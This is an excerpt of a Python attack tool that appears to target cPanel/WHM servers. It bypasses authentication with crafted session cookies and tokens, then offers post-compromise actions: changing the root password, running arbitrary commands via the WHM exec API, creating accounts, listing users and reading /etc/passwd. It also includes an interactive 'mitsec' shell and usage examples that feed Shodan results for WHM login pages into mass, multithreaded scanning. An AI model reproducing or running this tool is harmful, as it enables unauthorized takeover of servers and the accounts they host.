...
from urllib.parse import urlsplit, quote, unquote, urlencode, urlparse, parse_qs
...
def _do(
    ...
    if canonical_host:
        ...
        h["Host"] = (
            f"{canonical_host}:{port}" if port not in (80, 443) else canonical_host
        )
    if extra_headers:
...
def stage3_propagate(scheme, host, port, canonical, session_base, timeout) -> bool:
    ...
    body = resp.body or ""
    if resp.status == 401 and any(
        x in body for x in ["Token denied", "WHM Login", "login"]
    ):
...
# ══════════════════════════════════════════════════════════════
def whm_api(
    scheme, host, port, canonical, session_base, token, function, params, timeout
):
...
def action_list_accounts(ctx):
    ...
    s, data = whm_api(
        *ctx[:6], "listaccts", {"search": "", "searchtype": "user"}, ctx[6]
    )
    if isinstance(data, dict):
...
def action_change_passwd(ctx, new_password):
    ...
    s, data = whm_api(
        *ctx[:6], "passwd", {"user": "root", "password": new_password}, ctx[6], ctx[-1]
    )
    safe_print(
        json.dumps(data, indent=2)[:800] if isinstance(data, dict) else str(data)[:800]
    )
...
def action_exec_cmd(ctx, cmd):
    ...
    s, data = whm_api(*ctx[:6], "scripts/exec", {"command": cmd}, ctx[6])
    if isinstance(data, dict):
        output = data.get("data", {}).get(
            "output", data.get("metadata", {}).get("reason", str(data))
        )
...
def action_exec_cmd(ctx, cmd: str):
    ...
    if s == 200 and isinstance(data, dict):
        output = data.get("data", {}).get("output") or data.get("output") or str(data)
    ...
    for fpath in ["/etc/passwd", "/etc/hostname", "/proc/version", "/etc/os-release"]:
        for ep in [
            ...
            r3 = _do(
                url,
                extra_headers={"Cookie": f"whostmgrsession={cookie_enc2}"},
                timeout=timeout,
            )
            if (
                r3.status == 200
    ...
    log(
        "API",
        f"License blocks all exec on this target — version confirmed via /json-api/version",
    )
...
def action_create_user(ctx, username: str, domain: str, passwd: str):
    ...
    s, data = whm_api(
        *ctx[:6],
        "createacct",
        {"username": username, "domain": domain, "password": passwd, "plan": "default"},
        ctx[6],
        ctx[-1],
    )
    safe_print(
...
def action_version(ctx):
    ...
    safe_print(
        json.dumps(data, indent=2)[:600] if isinstance(data, dict) else str(data)[:600]
    )
...
class Store:
    ...
    def all(self):
        return sorted(
            self._f, key=lambda x: self._SEV.get(x.get("severity", "INFO"), 9)
        )
...
def scan(target: str, args) -> dict:
    ...
    verify = stage4_verify(scheme, host, port, canonical, session_base, token, timeout)
    ...
    log(
        "PWNED",
        f"  API URL  : {build_url(scheme, host, port, token + '/json-api/version')}",
    )
    ...
    result["ctx"] = (scheme, host, port, canonical, session_base, token, timeout)
...
def save_output(findings, out_file):
    os.makedirs(
        os.path.dirname(out_file) if os.path.dirname(out_file) else ".", exist_ok=True
    )
...
def whm_shell(ctx):
    ...
    prompt = (
        f"{C.RED}mitsec{C.RESET}@{C.CYAN}{target_display}{C.RESET} {C.BOLD}▶{C.RESET} "
    )
...
""")
                ...
                if content:
                    ...
                    for ep in [
                        ...
                        r4 = _do(
                            url,
                            extra_headers={"Cookie": f"whostmgrsession={cookie_enc3}"},
                            timeout=timeout2,
                        )
                        ...
                        print(
                            f"  {C.DIM}Cannot read {arg} — license blocks file access{C.RESET}"
                        )
                ...
                if s == 200 and isinstance(data, dict):
                    ...
                    if content:
                        print(
                            f"  {C.DIM}(ls not available — /etc/passwd preview):{C.RESET}"
                        )
...
def extract_url(line):
    ...
    if m2:
        return f"https://{m2.group(1)}:{m2.group(2)}"
    return None
...
Examples:
  ...
  shodan search --fields ip_str,port 'title:"WHM Login"' | \\
    ...
    tg.add_argument(
        "--hostname", help="Override canonical Host header (auto-discovered)"
    )

    sg = p.add_argument_group("Scan")
    sg.add_argument(
        "-t", "--threads", type=int, default=10, help="Threads (default: 10)"
    )
    sg.add_argument(
        "--timeout", type=int, default=15, help="Timeout seconds (default: 15)"
    )
